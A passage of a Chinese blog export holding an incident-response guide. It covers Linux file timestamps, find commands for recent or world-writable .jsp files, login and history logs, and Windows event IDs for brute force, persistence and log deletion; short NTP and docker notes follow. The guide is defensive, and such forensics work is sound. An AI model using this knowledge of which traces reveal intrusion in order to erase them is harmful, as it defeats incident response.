class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br> <br></code></pre></td></tr></table></figure><p>vim文件wq退出，修改文件modify和change时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# vim <span class="hljs-number">11</span>.txt<br><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0644</span>/-rw-r--r--)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">30</span>.<span class="hljs-number">511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">790640177</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>chmod改变文件属性，会修改Change时间</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># chmod o+x 11.txt</span><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># ls -lat 11.txt</span><br>-rw-r--r-x <span class="hljs-number">1</span> root root <span class="hljs-number">2</span> <span class="hljs-title class_">Mar</span> <span class="hljs-number">13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span> <span class="hljs-number">11</span>.txt<br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:/tmp/test</span><span class="hljs-comment"># stat 11.txt</span><br>  <span class="hljs-symbol">File:</span> <span class="hljs-number">11</span>.txt<br>  <span class="hljs-symbol">Size:</span> <span class="hljs-number">2</span>         <span class="hljs-symbol">Blocks:</span> <span class="hljs-number">8</span>          <span class="hljs-title class_">IO</span> <span class="hljs-symbol">Block:</span> <span class="hljs-number">4096</span>   regular file<br><span class="hljs-symbol">Device:</span> fc03h/<span class="hljs-number">64515</span>d<span class="hljs-symbol">Inode:</span> <span class="hljs-number">654221</span>      <span class="hljs-symbol">Links:</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">Access:</span> (<span class="hljs-number">0645</span>/-rw-r--r-x)  <span class="hljs-symbol">Uid:</span> (    <span class="hljs-number">0</span>/    root)   <span class="hljs-symbol">Gid:</span> (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-symbol">Access:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">30.511674240</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Modify:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">07</span><span class="hljs-symbol">:</span><span class="hljs-number">33.786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-symbol">Change:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">49.314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-symbol">Birth:</span> <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-13</span> <span class="hljs-number">09</span><span class="hljs-symbol">:</span><span class="hljs-number">52</span><span class="hljs-symbol">:</span><span class="hljs-number">26.983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web访问，会修改access时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:/tmp/test# stat <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">File</span>: <span class="hljs-number">11</span>.txt<br>  <span class="hljs-attribute">Size</span>: <span class="hljs-number">2</span>         Blocks: <span class="hljs-number">8</span>          IO Block: <span class="hljs-number">4096</span>   regular file<br><span class="hljs-attribute">Device</span>: fc03h/<span class="hljs-number">64515</span>dInode: <span class="hljs-number">654221</span>      Links: <span class="hljs-number">1</span><br><span class="hljs-attribute">Access</span>: (<span class="hljs-number">0645</span>/-rw-r--r-x)  Uid: (    <span class="hljs-number">0</span>/    root)   Gid: (    <span class="hljs-number">0</span>/    root)<br><span class="hljs-attribute">Access</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">46</span>:<span class="hljs-number">17</span>.<span class="hljs-number">408516145</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Modify</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">07</span>:<span class="hljs-number">33</span>.<span class="hljs-number">786640022</span> +<span class="hljs-number">0800</span><br><span class="hljs-attribute">Change</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49</span>.<span class="hljs-number">314207667</span> +<span class="hljs-number">0800</span><br> <span class="hljs-attribute">Birth</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">03</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">52</span>:<span class="hljs-number">26</span>.<span class="hljs-number">983537650</span> +<span class="hljs-number">0800</span><br></code></pre></td></tr></table></figure><p>web下载文件到设备，会修改文件的access和change时间，change时间会修改为落盘时间</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs subunit">2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 wget 下载<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# wget http://xx.xx.xx.xx:1234/11.txt<br>-<span class="hljs-string">-2024</span><span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33--  http://xx.xx.xx.xx:1234/11.txt<br>正在连接 xx.xx.xx.xx:1234... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2 [text/plain]<br>正在保存至: “11.txt”<br><br>100%[==============================================================================================================&gt;] 2           --.-K/s 用时 0s<br><br>2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33 (279 KB/s) - 已保存 “11.txt” [2/2])<br><br>(base) [root@aliyun<span class="hljs-string">-1</span>_1_1_1 tmp]# stat 11.txt<br>  文件：&quot;11.txt&quot;<br>  大小：2         块：8          IO 块：4096   普通文件<br>设备：fd01h/64769dInode：925677      硬链接：1<br>权限：(0644/-rw-r--r--)  Uid：(    0/    root)   Gid：(    0/    root)<br>最近访问：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.000000000 <span class="hljs-string">+0800</span><br>最近更改：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:07:33.000000000 <span class="hljs-string">+0800</span><br>最近改动：2024<span class="hljs-string">-03</span><span class="hljs-string">-13</span> 10:47:33.231719265 <span class="hljs-string">+0800</span><br>创建时间：-<br></code></pre></td></tr></table></figure><h4 id="排查tmp目录"><a href="#排查tmp目录" class="headerlink" title="排查tmp目录"></a>排查tmp目录</h4><p>任意用户可操作的目录，排查是否存在可疑文件</p><p>&#x2F;tmp&#x2F;</p><p>&#x2F;var&#x2F;tmp&#x2F;</p><h4 id="排查近期改动文件"><a href="#排查近期改动文件" class="headerlink" title="排查近期改动文件"></a>排查近期改动文件</h4><h5 id="24小时内被改动文件查找-全局查找"><a href="#24小时内被改动文件查找-全局查找" class="headerlink" title="24小时内被改动文件查找(全局查找)"></a>24小时内被改动文件查找(全局查找)</h5><p>查找24小时内修改过的jsp文件</p><p>find &#x2F; -mtime 0 -name “*.jsp”</p><h5 id="72小时内被新增文件查找-全局查找"><a href="#72小时内被新增文件查找-全局查找" class="headerlink" title="72小时内被新增文件查找(全局查找)"></a>72小时内被新增文件查找(全局查找)</h5><p>查找72小时内新增的文件</p><p>find &#x2F; -ctime 2 -name “*.*“</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-comment"># find / -ctime -2 -name &quot;*.*&quot;</span><br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10143</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/sessions/</span><span class="hljs-number">10142</span>.ref<br><span class="hljs-regexp">/run/systemd</span><span class="hljs-regexp">/system/session</span>-<span class="hljs-number">10143</span>.scope.d<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/audit/audit</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220823</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/error</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220822</span>.gz<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220824</span><br><span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log-<span class="hljs-number">20220823</span>.gz<br></code></pre></td></tr></table></figure><h4 id="排查高权限文件"><a href="#排查高权限文件" class="headerlink" title="排查高权限文件"></a>排查高权限文件</h4><h5 id="777权限文件查找"><a href="#777权限文件查找" class="headerlink" title="777权限文件查找"></a>777权限文件查找</h5><p>find &#x2F; -iname “*.jsp” -perm 777</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# find /</span> <span class="hljs-operator">-</span>iname <span class="hljs-string">&quot;*.jsp&quot;</span> <span class="hljs-operator">-</span>perm <span class="hljs-number">777</span><br><span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-regexp">/]# ls -lat /</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1</span>.jsp<br><span class="hljs-operator">-</span>rwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">5</span> <span class="hljs-number">8</span>月  <span class="hljs-number">24</span> <span class="hljs-number">21</span>:<span class="hljs-number">09</span> <span class="hljs-regexp">/tmp/</span><span class="hljs-number">1</span>.jsp<br></code></pre></td></tr></table></figure><h3 id="排查相关日志"><a href="#排查相关日志" class="headerlink" title="排查相关日志"></a>排查相关日志</h3><h4 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h4><h5 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h5><p>Q：</p><h5 id="具体日志"><a href="#具体日志" class="headerlink" title="具体日志"></a>具体日志</h5><h6 id="历史操作命令history"><a href="#历史操作命令history" class="headerlink" title="历史操作命令history"></a>历史操作命令history</h6><p>读取 ~&#x2F;.bash_history ，默认输出格式为：num command</p><p>默认保存1000条</p><p>.bash_history文件权限600，每个用户独有一份</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># ls -lat ~/.bash_history</span><br>-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 3738 </span>8月  <span class="hljs-number"> 7 </span>19:13 /root/.bash_history<br></code></pre></td></tr></table></figure><p>正常情况下是退出bash后会将历史命令信息保存在.bash_history文件中</p><h6 id="root-bash-history"><a href="#root-bash-history" class="headerlink" title="&#x2F;root&#x2F;.bash_history"></a>&#x2F;root&#x2F;.bash_history</h6><p>root 用户 history -w 写入的 history 记录文件</p><h6 id="var-spool-mail-root"><a href="#var-spool-mail-root" class="headerlink" title="&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root"></a>&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</h6><h6 id="var-log-wtmp"><a href="#var-log-wtmp" class="headerlink" title="&#x2F;var&#x2F;log&#x2F;wtmp"></a>&#x2F;var&#x2F;log&#x2F;wtmp</h6><h6 id="检查系统用户登录日志"><a href="#检查系统用户登录日志" class="headerlink" title="检查系统用户登录日志"></a>检查系统用户登录日志</h6><p>日志路径：&#x2F;var&#x2F;log&#x2F;secure</p><h6 id="检查密码登录成功记录"><a href="#检查密码登录成功记录" class="headerlink" title="检查密码登录成功记录"></a>检查密码登录成功记录</h6><p>查看登录成功记录的来源IP判断入侵来源，可以将来源IP进行威胁情报检测，查看IP状态</p><p>cat secure* | grep “Accepted password”</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span><span class="hljs-number">-1</span>_1_1_1 <span class="hljs-built_in">log</span>]<span class="hljs-meta"># cat secure* | grep <span class="hljs-string">&quot;Accepted password&quot;</span></span><br>Mar <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">25</span>:<span class="hljs-number">08</span> aliyun<span class="hljs-number">-1</span>_1_1_1 sshd[<span class="hljs-number">14458</span>]: Accepted password <span class="hljs-keyword">for</span> root from <span class="hljs-number">8.3</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span> port <span class="hljs-number">16045</span> ssh2<br></code></pre></td></tr></table></figure><h4 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h4><p>基于Windows11专业版</p><p>运行输入 eventvwr.msc 命令&#x2F;直接搜索“事件查看器”打开事件查看器</p><h5 id="排查思路-1"><a href="#排查思路-1" class="headerlink" title="排查思路"></a>排查思路</h5><h6 id="检查是否存在爆破"><a href="#检查是否存在爆破" class="headerlink" title="检查是否存在爆破"></a>检查是否存在爆破</h6><p>4624 账户登录成功日志</p><p>4625 账户登录失败日志</p><h6 id="检查是否存在权限维持"><a href="#检查是否存在权限维持" class="headerlink" title="检查是否存在权限维持"></a>检查是否存在权限维持</h6><p>4720 新增账户日志</p><p>4726 删除账户日志</p><p>4724 账户密码重置</p><p>7045 系统日志-服务安装</p><p>4719 更改审核&#x2F;审计策略日志</p><h6 id="检查是否存在权限提升"><a href="#检查是否存在权限提升" class="headerlink" title="检查是否存在权限提升"></a>检查是否存在权限提升</h6><p>4732 账户权限变更</p><p>4672 账户登录分配特殊权限</p><h6 id="检查是否存在日志删除等痕迹消除"><a href="#检查是否存在日志删除等痕迹消除" class="headerlink" title="检查是否存在日志删除等痕迹消除"></a>检查是否存在日志删除等痕迹消除</h6><p>1102 日志删除日志</p><h5 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h5><h6 id="4624-账户登录成功日志"><a href="#4624-账户登录成功日志" class="headerlink" title="4624 账户登录成功日志"></a>4624 账户登录成功日志</h6><p><img src="/image-20241125140024535.png" alt="image-20241125140024535"></p><h6 id="4625-账户登录失败日志"><a href="#4625-账户登录失败日志" class="headerlink" title="4625 账户登录失败日志"></a>4625 账户登录失败日志</h6><p><img src="/image-20241125135958626.png" alt="image-20241125135958626"></p><h6 id="4720-新增账户日志"><a href="#4720-新增账户日志" class="headerlink" title="4720 新增账户日志"></a>4720 新增账户日志</h6><p><img src="/image-20241125140454155.png" alt="image-20241125140454155"></p><h6 id="4726-删除账户日志"><a href="#4726-删除账户日志" class="headerlink" title="4726 删除账户日志"></a>4726 删除账户日志</h6><p><img src="/image-20241125141610204.png" alt="image-20241125141610204"></p><h6 id="4732-账户权限变更"><a href="#4732-账户权限变更" class="headerlink" title="4732 账户权限变更"></a>4732 账户权限变更</h6><p>加入对应组</p><p><img src="/image-20241125140712767.png" alt="image-20241125140712767"></p><h6 id="4672-账户登录分配特殊权限"><a href="#4672-账户登录分配特殊权限" class="headerlink" title="4672 账户登录分配特殊权限"></a>4672 账户登录分配特殊权限</h6><p><img src="/image-20241125141403152.png" alt="image-20241125141403152"></p><h6 id="4724-账户密码重置"><a href="#4724-账户密码重置" class="headerlink" title="4724 账户密码重置"></a>4724 账户密码重置</h6><p><img src="/image-20241125141016730.png" alt="image-20241125141016730"></p><h6 id="4719-更改审核-审计策略日志"><a href="#4719-更改审核-审计策略日志" class="headerlink" title="4719 更改审核&#x2F;审计策略日志"></a>4719 更改审核&#x2F;审计策略日志</h6><p><img src="/image-20241125144203503.png" alt="image-20241125144203503"></p><h6 id="1102-日志删除日志"><a href="#1102-日志删除日志" class="headerlink" title="1102 日志删除日志"></a>1102 日志删除日志</h6><p><img src="/image-20241125165212144.png" alt="image-20241125165212144"></p><h5 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h5><h6 id="7045-服务安装日志"><a href="#7045-服务安装日志" class="headerlink" title="7045 服务安装日志"></a>7045 服务安装日志</h6><p><img src="/image-20241125142037647.png" alt="image-20241125142037647"></p><h3 id="命令替换工具busybox"><a href="#命令替换工具busybox" class="headerlink" title="命令替换工具busybox"></a>命令替换工具busybox</h3><p><a href="https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox">https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netSec</category>
      
      <category>secresponse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netSec</tag>
      
      <tag>secresponse</tag>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ntp_domain</title>
    <link href="/2024/03/08/yunwei/applications/ntp/ntp_domain/"/>
    <url>/2024/03/08/yunwei/applications/ntp/ntp_domain/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="常见ntp服务域名"><a href="#常见ntp服务域名" class="headerlink" title="常见ntp服务域名"></a>常见ntp服务域名</h1><h2 id="阿里云"><a href="#阿里云" class="headerlink" title="阿里云"></a>阿里云</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><table><thead><tr><th align="left">经典网络内网</th><th align="left">专有网络VPC内网</th><th align="left">公网</th></tr></thead><tbody><tr><td align="left">-</td><td align="left">ntp.cloud.aliyuncs.com</td><td align="left">ntp.aliyun.com</td></tr><tr><td align="left">ntp1.cloud.aliyuncs.com</td><td align="left">ntp7.cloud.aliyuncs.com</td><td align="left">ntp1.aliyun.com</td></tr><tr><td align="left">ntp2.cloud.aliyuncs.com</td><td align="left">ntp8.cloud.aliyuncs.com</td><td align="left">ntp2.aliyun.com</td></tr><tr><td align="left">ntp3.cloud.aliyuncs.com</td><td align="left">ntp9.cloud.aliyuncs.com</td><td align="left">ntp3.aliyun.com</td></tr><tr><td align="left">ntp4.cloud.aliyuncs.com</td><td align="left">ntp10.cloud.aliyuncs.com</td><td align="left">ntp4.aliyun.com</td></tr><tr><td align="left">ntp5.cloud.aliyuncs.com</td><td align="left">ntp11.cloud.aliyuncs.com</td><td align="left">ntp5.aliyun.com</td></tr><tr><td align="left">ntp6.cloud.aliyuncs.com</td><td align="left">ntp12.cloud.aliyuncs.com</td><td align="left">ntp6.aliyun.com</td></tr><tr><td align="left">-</td><td align="left">-</td><td align="left">ntp7.aliyun.com</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>ntp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ntp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_error</title>
    <link href="/2024/03/07/yunwei/applications/docker/docker_error/"/>
    <url>/2024/03/07/yunwei/applications/docker/docker_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="docker-pull-error"><a href="#docker-pull-error" class="headerlink" title="docker pull error"></a>docker pull error</h1><h2 id="image-name-error"><a href="#image-name-error" class="headerlink" title="image name error"></a>image name error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab-ce/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: pull access denied for gitlab-ce/gitlab-ce, repository does not exist or may require &#x27;docker login&#x27;: denied: requested access to the resource is denied<br></code></pre></td></tr></table></figure><p>因为镜像名称写错导致报错，正确镜像名称gitlab&#x2F;gitlab-ce</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">(base) root<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># docker search gitlab-ce</span><br><span class="hljs-title class_">NAME</span>                                     <span class="hljs-title class_">DESCRIPTION</span>                                     <span class="hljs-title class_">STARS</span>     <span class="hljs-title class_">OFFICIAL</span>   <span class="hljs-title class_">AUTOMATED</span><br>gitlab/gitlab-ce                         <span class="hljs-title class_">GitLab</span> <span class="hljs-title class_">Community</span> <span class="hljs-title class_">Edition</span> docker image based …   <span class="hljs-number">3592</span>                 [<span class="hljs-title class_">OK</span>]<br><br></code></pre></td></tr></table></figure><h2 id="image-tag-error"><a href="#image-tag-error" class="headerlink" title="image tag error"></a>image tag error</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) root@localhost:~# docker pull gitlab/gitlab-ce:14.9.1<br><span class="hljs-keyword">Error </span>response from daemon: manifest for gitlab/gitlab-ce:14.9.1 not found: manifest unknown: manifest unknown<br><br></code></pre></td></tr></table></figure><p>因为镜像版本号不对导致报错，需要正确版本号</p><p>如何确认正常版本号</p><p>登录docker hub <a href="https://hub.docker.com/u/library">https://hub.docker.com/u/library</a> 搜索对应的镜像</p><p>复制提供的命令即可正确下载</p><p><a href="https://blog.csdn.net/ichen820/article/details/114536044">https://blog.csdn.net/ichen820/article/details/114536044</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ftp_base</title>
    <link href="/2024/03/04/yunwei/applications/ftp/ftp_base/"/>
    <url>/2024/03/04/yunwei/applications/ftp/ftp_base/</url>
    
